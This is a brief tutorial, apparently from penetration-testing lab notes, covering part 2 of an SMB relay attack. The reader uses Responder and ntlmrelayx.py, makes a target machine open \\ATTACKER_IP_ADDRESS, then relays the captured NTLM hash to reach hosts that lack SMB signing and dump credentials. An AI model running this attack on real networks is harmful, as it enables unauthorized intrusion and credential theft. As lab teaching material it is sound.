# SMB Relay Attack Demonstration Part 2

### **SMB Relay Attack Demonstration – Part 2**

#### **🔹 Step 1: Ensure Part 1 Setup is Complete**

✅ Ensure that **Responder** and **ntlmrelayx.py** are running as configured in **Part 1**.\
✅ Confirm that the target.txt file contains the target IP address.\
✅ Make sure `SMB` and `HTTP` are set to **Off** in the Responder configuration file.

***

#### **🔹 Step 2: Trigger SMB Relay Attack**

1.  From the **target machine** (e.g., Windows 10):

    * Open **File Explorer**
    * In the address bar, type the following format:

    ```
    \\ATTACKER_IP_ADDRESS  
    ```

    ✅ Example:

    ```
    \\192.168.1.10  
    ```

    🚨 **Do NOT use `https://` or `http://`**
2. If successful:
   * The target machine will try to authenticate using NTLM.
   * The NTLM hash will be captured and relayed to the target server by `ntlmrelayx.py`.
   * If SMB signing is **disabled**, the attacker will gain access.

***

#### **🔹 Step 3: Monitor Output**

✅ Check the output of `ntlmrelayx.py` for successful authentication and session creation.\
✅ If successful, the attacker can execute commands, dump credentials, or access sensitive data.

***

#### ✅ **Goal:**

👉 Capture NTLM hashes from the target and relay them to authenticate and gain unauthorized access.

